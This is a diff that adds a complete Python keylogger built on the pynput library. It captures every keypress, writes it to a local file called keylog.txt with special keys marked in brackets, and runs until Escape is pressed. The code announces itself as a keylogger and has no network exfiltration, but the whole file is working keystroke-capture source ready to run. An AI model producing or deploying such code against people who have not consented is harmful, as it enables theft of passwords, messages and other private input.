@@ -1,0 +1,37 @@
+from pynput import keyboard
+
+def on_press(key):
+    """
+    Callback function triggered when a key is pressed.
+    Logs the key to a file.
+    """
+    try:
+        with open("keylog.txt", "a") as log_file:
+            if hasattr(key, 'char') and key.char is not None:
+                log_file.write(key.char)
+            elif key == keyboard.Key.space:
+                log_file.write(' ')
+            else:
+                log_file.write(f'[{key}]')  # Logs special keys (e.g., [Enter])
+    except Exception as e:
+        print(f"Error logging key: {e}")
+
+def on_release(key):
+    """
+    Callback function triggered when a key is released.
+    Stops the listener if the escape key is pressed.
+    """
+    if key == keyboard.Key.esc:  # Stop listener on Escape key
+        print("Escape key pressed. Stopping keylogger.")
+        return False
+
+def main():
+    """
+    Main function to start the keylogger.
+    """
+    print("Keylogger is running... Press 'Escape' to stop.")
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()
